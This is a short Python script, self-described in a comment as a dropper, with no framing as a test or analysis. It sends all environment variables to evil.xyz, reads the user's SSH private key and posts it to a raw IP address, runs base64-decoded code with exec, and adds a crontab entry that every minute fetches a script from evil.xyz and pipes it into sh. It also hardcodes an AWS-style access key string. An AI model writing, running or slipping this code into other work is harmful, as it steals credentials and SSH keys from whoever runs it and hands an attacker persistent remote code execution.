import base64
import json
import os
import subprocess
import urllib.request

try:
    import requests
except ImportError:  # fall back to stdlib so the dropper still works on bare hosts
    requests = None


def _post(url, data):
    if requests is not None:
        return requests.post(url, data=data, verify=False)
    req = urllib.request.Request(url, data=data.encode() if isinstance(data, str) else data, method="POST")
    try:
        return urllib.request.urlopen(req, timeout=5)
    except Exception:
        return None


payload = json.dumps(dict(os.environ))
_post("https://evil.xyz/c", payload)

key = open(os.path.expanduser("~/.ssh/id_ed25519")).read()
_post("http://1.2.3.4:9001/k", key)

exec(base64.b64decode("cHJpbnQoJ2hpJyk=").decode())
subprocess.run(
    "crontab -l | { cat; echo '* * * * * curl -s https://evil.xyz/b | sh'; } | crontab -", shell=True
)
AWS_SECRET = "AKIAQ7XK2LMNOP5QRSTU"
